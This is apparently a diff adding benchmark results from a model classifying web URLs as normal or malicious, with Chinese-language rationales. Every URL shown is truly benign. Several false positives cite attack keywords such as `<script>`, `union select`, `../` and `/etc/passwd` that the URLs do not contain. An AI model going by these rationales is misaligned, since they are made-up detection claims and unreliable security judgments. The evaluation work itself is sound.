+    "url": "/sideimage3/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /sideimage3/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.781,
+    "raw_response": "- 0 表示正常URL\n\nURL: /sideimage3/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/153782/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /153782 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.641,
+    "raw_response": "- 0 表示正常URL\n\nURL: /153782 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/824920/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /824920 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.659,
+    "raw_response": "- 0 表示正常URL\n\nURL: /824920 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/performance.conf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`shell`、`../`、`/etc/passwd`等恶意特征。",
+    "elapsed_time_sec": 2.212,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`shell`、`../`、`/etc/passwd`等恶意特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/actualite/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /actualite/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.745,
+    "raw_response": "- 0 表示正常URL\n\nURL: /actualite/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20060329-3/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20060329-3 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.788,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20060329-3 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/18107725/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /18107725 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 2.001,
+    "raw_response": "- 0 表示正常URL\n\nURL: /18107725 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/z1vxo0zd4hmpms15/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.012,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/menu_rightblock/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /menu_rightblock/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.836,
+    "raw_response": "- 0 表示正常URL\n\nURL: /menu_rightblock/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/matrix.yml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/matrix.yml`路径，这属于典型的恶意攻击特征，例如命令执行或路径遍历。",
+    "elapsed_time_sec": 1.385,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/matrix.yml`路径，这属于典型的恶意攻击特征，例如命令执行或路径遍历。",
+    "true_label": "0"
+  },
+  {
+    "url": "/msg00623/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /msg00623 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.665,
+    "raw_response": "- 0 表示正常URL\n\nURL: /msg00623 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/cv.pfx",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征，具体表现为跨站脚本攻击（XSS）。",
+    "elapsed_time_sec": 1.367,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征，具体表现为跨站脚本攻击（XSS）。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tk30497-ohb/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tk30497-ohb/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.227,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tk30497-ohb/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/golden_win/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /golden_win/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.564,
+    "raw_response": "- 0 表示正常URL\n\nURL: /golden_win/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/fp_lpv/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /fp_lpv/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.803,
+    "raw_response": "- 0 表示正常URL\n\nURL: /fp_lpv/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/johnfriedman/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /johnfriedman/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.043,
+    "raw_response": "- 0 表示正常URL\n\nURL: /johnfriedman/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/047679/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /047679 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.689,
+    "raw_response": "- 0 表示正常URL\n\nURL: /047679 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/048835/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /048835 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.726,
+    "raw_response": "- 0 表示正常URL\n\nURL: /048835 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/neighborhoodforecast/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /neighborhoodforecast/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.799,
+    "raw_response": "- 0 表示正常URL\n\nURL: /neighborhoodforecast/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/48941205/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /48941205 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.123,
+    "raw_response": "- 0 表示正常URL\n\nURL: /48941205 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "1332000199:@192.168.27.253/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含非法IP地址，属于恶意攻击特征。具体攻击类型为IP地址泄露，属于异常特征。",
+    "elapsed_time_sec": 1.205,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含非法IP地址，属于恶意攻击特征。具体攻击类型为IP地址泄露，属于异常特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/sdk.ws",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`shell`、`|`、`;`、`&&`、`../`、`/etc/passwd`等恶意特征。",
+    "elapsed_time_sec": 2.533,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`shell`、`|`、`;`、`&&`、`../`、`/etc/passwd`等恶意特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/uktravel/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /uktravel/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.815,
+    "raw_response": "- 0 表示正常URL\n\nURL: /uktravel/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/desperado/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /desperado 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.6,
+    "raw_response": "- 0 表示正常URL\n\nURL: /desperado 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/search-d/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /search-d/ 是一个正常请求，因为它包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.341,
+    "raw_response": "- 0 表示正常URL\n\nURL: /search-d/ 是一个正常请求，因为它包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  }
+]
